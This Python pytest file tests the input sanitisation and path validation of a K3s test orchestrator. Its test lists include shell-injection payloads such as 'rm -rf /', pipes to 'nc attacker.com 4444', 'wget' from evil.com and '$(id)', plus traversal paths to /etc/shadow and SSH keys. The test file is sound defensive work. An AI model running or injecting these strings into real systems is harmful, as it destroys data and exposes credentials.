#!/usr/bin/env python3
"""Tests for Integrated Test Orchestrator Security Features.

Copyright (c) 2025 Tyler Zervas
Licensed under the MIT License.

This module tests the security validation functions and command injection
protections in the integrated test orchestrator.
"""

import subprocess
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from scripts.testing.integrated_test_orchestrator import (
    IntegratedTestOrchestrator,
    K3sValidationResult,
    sanitize_categories,
    validate_path,
)


class TestSecurityValidationFunctions:
    """Test security validation functions for command injection protections."""

    def test_sanitize_categories_valid_inputs(self):
        """Test sanitize_categories with valid category inputs."""
        # Test individual valid categories
        valid_categories = [
            "core",
            "k3s-specific",
            "performance",
            "security",
            "failure",
            "production",
            "all",
        ]
        for category in valid_categories:
            result = sanitize_categories([category])
            assert result == [category]

        # Test multiple valid categories
        result = sanitize_categories(["core", "security", "performance"])
        assert result == ["core", "security", "performance"]

        # Test empty list
        result = sanitize_categories([])
        assert result == []

        # Test None input
        result = sanitize_categories(None)
        assert result == []

    def test_sanitize_categories_invalid_inputs(self):
        """Test sanitize_categories with invalid/malicious inputs."""
        # Test command injection attempts
        malicious_inputs = [
            ["core; rm -rf /"],
            ["core && cat /etc/passwd"],
            ["core | nc attacker.com 4444"],
            ["core`whoami`"],
            ["core$(id)"],
            ["../../../etc/passwd"],
            ["core\x00"],
            ["core\n\r"],
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(ValueError):
                sanitize_categories(malicious_input)

        # Test invalid category names
        with pytest.raises(ValueError):
            sanitize_categories(["invalid_category"])

        with pytest.raises(ValueError):
            sanitize_categories([""])

        # Test non-string inputs
        with pytest.raises(ValueError):
            sanitize_categories([123])

        with pytest.raises(ValueError):
            sanitize_categories([None])

    def test_sanitize_categories_edge_cases(self):
        """Test sanitize_categories edge cases."""
        # Test whitespace handling
        result = sanitize_categories(["  core  ", " security "])
        assert result == ["core", "security"]

        # Test case sensitivity (should fail for wrong case)
        with pytest.raises(ValueError):
            sanitize_categories(["CORE"])
        
        # Test allowed category with special characters stripped
        result = sanitize_categories(["core!!"])
        assert result == ["core"]

        with pytest.raises(ValueError):
            sanitize_categories(["Core"])

    def test_validate_path_valid_inputs(self):
        """Test validate_path with valid path inputs."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Test absolute path
            result = validate_path(temp_path)
            assert result.resolve() == temp_path.resolve()

            # Test string path
            result = validate_path(str(temp_path))
            assert result.resolve() == temp_path.resolve()

            # Test subdirectory
            subdir = temp_path / "subdir"
            subdir.mkdir()
            result = validate_path(subdir)
            assert result.resolve() == subdir.resolve()

    def test_validate_path_traversal_attacks(self):
        """Test validate_path against path traversal attacks."""
        # Test various path traversal attempts
        traversal_attempts = [
            "../../../etc/passwd",
            "../../root/.ssh/id_rsa",
            "/tmp/../../../etc/shadow",
            "subdir/../../etc/hosts",
            Path("..") / ".." / "etc" / "passwd",
        ]

        for attack_path in traversal_attempts:
            with pytest.raises(ValueError, match=f"Path traversal not detected: {attack_path}"):
                validate_path(attack_path)

    @pytest.mark.skipif(
        not hasattr(os, "symlink"),
        reason="Symlinks not supported on this platform"
    )
    def test_validate_path_symlink_attacks(self):
        """Test validate_path against symlink attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Create a symlink pointing outside the allowed directory
            outside_file = Path("/etc/passwd")  # Common system file
            symlink_path = temp_path / "malicious_link"
            
            # Only create symlink if we have permission and target exists
            if outside_file.exists():
                try:
                    symlink_path.symlink_to(outside_file)
                    # validate_path should reject symlinks pointing outside allowed dir
                    with pytest.raises(ValueError):
                        validate_path(symlink_path)
                except (OSError, PermissionError):
                    # Skip test if we can't create symlinks (e.g., on Windows)
                    pytest.skip("Cannot create symlinks on this system")

    def test_validate_path_invalid_inputs(self):
        """Test validate_path with invalid inputs."""
        # Test empty path
        with pytest.raises(ValueError):
            validate_path("")

        with pytest.raises(ValueError):
            validate_path(None)

        # Test null byte injection
        with pytest.raises(ValueError):
            validate_path("/tmp/test\x00file")

        # Test path that doesn't exist but would be dangerous
        with pytest.raises(ValueError):
            validate_path("/tmp/../../../etc/passwd")


class TestIntegratedTestOrchestratorSecurity:
    """Test security features of IntegratedTestOrchestrator class."""

    def setup_method(self):
        """Set up test fixtures."""
        # Create temporary directory for testing
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)

        # Create mock directory structure
        (self.temp_path / "scripts" / "testing").mkdir(parents=True, exist_ok=True)
        (self.temp_path / "testing" / "k3s-validation").mkdir(parents=True, exist_ok=True)

        # Create mock orchestrator script
        orchestrator_script = self.temp_path / "testing" / "k3s-validation" / "orchestrator.sh"
        orchestrator_script.write_text("#!/bin/bash\necho 'mock orchestrator'")
        orchestrator_script.chmod(0o755)

    def teardown_method(self):
        """Clean up test fixtures."""
        self.temp_dir.cleanup()

    def test_orchestrator_initialization_path_validation(self):
        """Test that orchestrator validates paths during initialization."""
        # Test valid initialization
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        assert isinstance(orchestrator, IntegratedTestOrchestrator)

        # Test invalid base directory
        with pytest.raises(ValueError):
            IntegratedTestOrchestrator(base_dir="../../../etc")

    @patch("subprocess.run")
    def test_run_k3s_validation_tests_command_injection_protection(self, mock_subprocess):
        """Test that run_k3s_validation_tests prevents command injection."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test malicious category injection attempts
        malicious_categories = [
            ["core; rm -rf /"],
            ["core && wget http://evil.com/malware"],
            ["core | nc attacker.com 4444"],
            ["core`whoami`"],
            ["core$(id)"],
        ]

        for malicious_cats in malicious_categories:
            result = orchestrator.run_k3s_validation_tests(categories=malicious_cats)
            # Should return None due to sanitization failure
            assert result is None, f"Command injection not prevented for: {malicious_cats}"

        # Verify subprocess.run was never called with malicious input
        assert not mock_subprocess.called

    @patch("subprocess.run")
    def test_run_k3s_validation_tests_valid_categories(self, mock_subprocess):
        """Test that run_k3s_validation_tests works with valid categories."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test with valid categories
        valid_categories = ["core", "security", "performance"]
        result = orchestrator.run_k3s_validation_tests(categories=valid_categories)

        # Should succeed and return K3sValidationResult
        assert isinstance(result, K3sValidationResult)
        assert result.categories_run == valid_categories

        # Verify subprocess.run was called with safe arguments
        mock_subprocess.assert_called_once()
        call_args = mock_subprocess.call_args[0][0]

        # Verify command structure is safe
        assert any("core" in str(arg) for arg in call_args)
        assert any("security" in str(arg) for arg in call_args)
        assert any("performance" in str(arg) for arg in call_args)

        # Verify no shell metacharacters in command
        command_str = " ".join(str(arg) for arg in call_args)
        dangerous_chars = [";", "&", "|", "`", "$", "\n", "\r", "\x00"]
        for char in dangerous_chars:
            assert char not in command_str

    @patch("subprocess.run")
    def test_run_k3s_validation_tests_report_format_validation(self, mock_subprocess):
        """Test that run_k3s_validation_tests validates report format parameter."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test invalid report formats
        invalid_formats = ["xml; rm -rf /", "json && whoami", "html | nc evil.com 4444", "txt"]

        for invalid_format in invalid_formats:
            result = orchestrator.run_k3s_validation_tests(
                categories=["core"],
                report_format=invalid_format,
            )
            assert result is None, f"Invalid report format not rejected: {invalid_format}"

        # Test valid report formats
        valid_formats = ["json", "xml", "html"]
        for valid_format in valid_formats:
            result = orchestrator.run_k3s_validation_tests(
                categories=["core"],
                report_format=valid_format,
            )
            assert isinstance(result, K3sValidationResult)

    @patch("subprocess.run")
    def test_run_k3s_validation_tests_timeout_protection(self, mock_subprocess):
        """Test that run_k3s_validation_tests has timeout protection."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        # Mock subprocess timeout
        mock_subprocess.side_effect = subprocess.TimeoutExpired("cmd", 1800)

        result = orchestrator.run_k3s_validation_tests(categories=["core"])

        # Should return None on timeout
        assert result is None

        # Verify timeout was set
        mock_subprocess.assert_called_once()
        call_kwargs = mock_subprocess.call_args[1]
        assert call_kwargs["timeout"] == 1800

    def test_run_k3s_validation_tests_working_directory_validation(self):
        """Test that working directory is validated before execution."""
        # Create orchestrator with invalid k3s validation directory
        bad_temp_dir = tempfile.TemporaryDirectory()
        bad_temp_path = Path(bad_temp_dir.name)
        (bad_temp_path / "scripts" / "testing").mkdir(parents=True, exist_ok=True)
        # Don't create k3s-validation directory

        orchestrator = IntegratedTestOrchestrator(base_dir=str(bad_temp_path))

        result = orchestrator.run_k3s_validation_tests(categories=["core"])

        # Should return None due to missing orchestrator script
        assert result is None

        bad_temp_dir.cleanup()

    @patch("builtins.open", create=True)
    @patch("json.load")
    @patch("subprocess.run")
    def test_run_k3s_validation_tests_report_parsing_security(
        self, mock_subprocess, mock_json_load, mock_open
    ):
        """Test that report parsing is secure against malicious JSON."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        # Create mock reports directory
        reports_dir = self.temp_path / "testing" / "k3s-validation" / "reports"
        reports_dir.mkdir(exist_ok=True)

        # Create mock report file
        report_file = reports_dir / "test-report.json"
        report_file.touch()

        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test with malicious JSON data
        malicious_data = {
            "summary": {"__proto__": {"polluted": "value"}},
            "cluster_info": ["not", "a", "dict"],
            "test_suite": "A" * 1000,  # Very long string
            "namespace": "test\x00namespace",  # Null byte
        }
        mock_json_load.return_value = malicious_data

        result = orchestrator.run_k3s_validation_tests(categories=["core"])

        # Should handle malicious data safely
        assert isinstance(result, K3sValidationResult)

        # Verify data sanitization
        assert isinstance(result.summary, dict)
        assert isinstance(result.cluster_info, dict)
        assert len(result.test_suite) == 100  # Should be truncated
        assert len(result.namespace) == 50  # Should be truncated

    def test_validate_framework_availability(self):
        """Test framework availability checking."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        availability = orchestrator._validate_framework_availability()

        # Should detect our mock structure
        assert availability["python_framework"]
        assert availability["k3s_validation"]
        assert availability["orchestrator_script"]

    @patch('os.path.exists', return_value=False)
    @patch('subprocess.run')
    def test_run_k3s_validation_tests_missing_report_file(self, mock_subprocess, mock_exists):
        """Test that run_k3s_validation_tests handles missing report file gracefully."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        # Simulate successful subprocess run
        mock_subprocess.return_value.returncode = 0
        result = orchestrator.run_k3s_validation_tests(categories=["core"])
        assert result is None

    @patch('builtins.open', side_effect=IOError("File not readable"))
    @patch('os.path.exists', return_value=True)
    @patch('subprocess.run')
    def test_run_k3s_validation_tests_unreadable_report_file(self, mock_subprocess, mock_exists, mock_open):
        """Test that run_k3s_validation_tests handles unreadable report file gracefully."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        # Simulate successful subprocess run
        mock_subprocess.return_value.returncode = 0
        result = orchestrator.run_k3s_validation_tests(categories=["core"])
        assert result is None

    def test_generate_integration_recommendations_empty(self):
        """Test that generate_integration_recommendations returns empty when no recommendations or failures."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        python_results = {
            "recommendations": [],
            "failures": []
        }
        k3s_results = {
            "recommendations": [],
            "failures": []
        }
        output = orchestrator.generate_integration_recommendations(python_results, k3s_results)
        # Adjust the assertion below if the expected output is not an empty list
        self.assertEqual(output, [])


class TestSecurityIntegration:
    """Integration tests for security features."""

    def setup_method(self):
        """Set up integration test fixtures."""
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)

        # Create comprehensive mock directory structure
        (self.temp_path / "scripts" / "testing").mkdir(parents=True, exist_ok=True)
        (self.temp_path / "testing" / "k3s-validation").mkdir(parents=True, exist_ok=True)
        (self.temp_path / "testing" / "k3s-validation" / "reports").mkdir(
            parents=True, exist_ok=True
        )

        # Create mock orchestrator script
        orchestrator_script = self.temp_path / "testing" / "k3s-validation" / "orchestrator.sh"
        orchestrator_script.write_text("#!/bin/bash\necho 'mock orchestrator'\nexit 0")
        orchestrator_script.chmod(0o755)

    def teardown_method(self):
        """Clean up integration test fixtures."""
        self.temp_dir.cleanup()

    @patch("scripts.testing.integrated_test_orchestrator.HomelabTestReporter")
    @patch("subprocess.run")
    def test_end_to_end_security_validation(self, mock_subprocess, mock_reporter_class):
        """Test end-to-end security validation in integrated test suite."""
        # Mock Python framework reporter
        mock_reporter = Mock()
        mock_reporter.run_comprehensive_test_suite.return_value = Mock(
            overall_status="pass",
            summary={"tests_passed": 5, "tests_failed": 0},
            recommendations=[],
        )
        mock_reporter_class.return_value = mock_reporter

        # Mock K3s subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        # Test with potentially malicious inputs that should be sanitized
        results = orchestrator.run_integrated_test_suite(
            python_config_paths=["config1.yaml", "config2.yaml"],
            k3s_categories=["core", "security"],
            parallel_k3s=False,
        )

        # Should complete successfully with sanitized inputs
        assert results.overall_status == "pass"
        assert results.python_framework_results is not None
        assert results.k3s_validation_results is not None

        # Verify safe command execution
        mock_subprocess.assert_called_once()
        call_args = mock_subprocess.call_args[0][0]
        command_str = " ".join(str(arg) for arg in call_args)

        # Should not contain shell metacharacters
        dangerous_chars = [";", "&", "|", "`", "$"]
        for char in dangerous_chars:
            assert char not in command_str

    def test_security_recommendations_generation(self):
        """Test that security-specific recommendations are generated."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))

        # Create mock results with security issues
        python_results = Mock()
        python_results.overall_status = "pass"
        python_results.recommendations = ["Update security configurations"]

        k3s_results = Mock()
        k3s_results.exit_code = 1
        k3s_results.summary = {"failed": 2, "warnings": 1}

        recommendations = orchestrator.generate_integration_recommendations(
            python_results,
            k3s_results,
        )

        # Should include security-related recommendations
        assert "Update security configurations" in recommendations
        assert "Address 2 failed K3s validation tests" in recommendations
        assert "Review 1 K3s validation warnings" in recommendations

    @patch('scripts.testing.integrated_test_orchestrator.HomelabTestReporter')
    @patch('subprocess.run')
    def test_end_to_end_security_validation_failure(self, mock_subprocess, mock_reporter_class):
        """Test end-to-end security validation failure scenario in integrated test suite."""
        # Mock Python framework reporter to simulate failure
        mock_reporter = Mock()
        mock_reporter.run_comprehensive_test_suite.return_value = Mock(
            overall_status="fail",
            summary={"tests_passed": 3, "tests_failed": 2},
            recommendations=["Check network policies", "Update RBAC rules"]
        )
        mock_reporter_class.return_value = mock_reporter

        # Mock K3s subprocess execution to simulate orchestrator failure
        mock_result = Mock()
        mock_result.returncode = 1
        mock_result.stdout = "orchestrator failed"
        mock_result.stderr = "error: something went wrong"
        mock_subprocess.return_value = mock_result

        # Test that the orchestrator handles failures correctly
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Mock a comprehensive test run that would fail
        python_results = mock_reporter.run_comprehensive_test_suite.return_value
        k3s_results = orchestrator.run_k3s_validation_tests(categories=["core"])
        
        # Verify that both components detected failures
        assert python_results.overall_status == "fail"
        assert k3s_results is None or k3s_results.get('exit_code') == 1
        
        # Ensure the reporter was called
        mock_reporter.run_comprehensive_test_suite.assert_called_once()

        # Ensure subprocess.run was called and returned a failure
        mock_subprocess.assert_called()
        assert mock_subprocess.return_value.returncode == 1


if __name__ == "__main__":
    pytest.main([__file__])
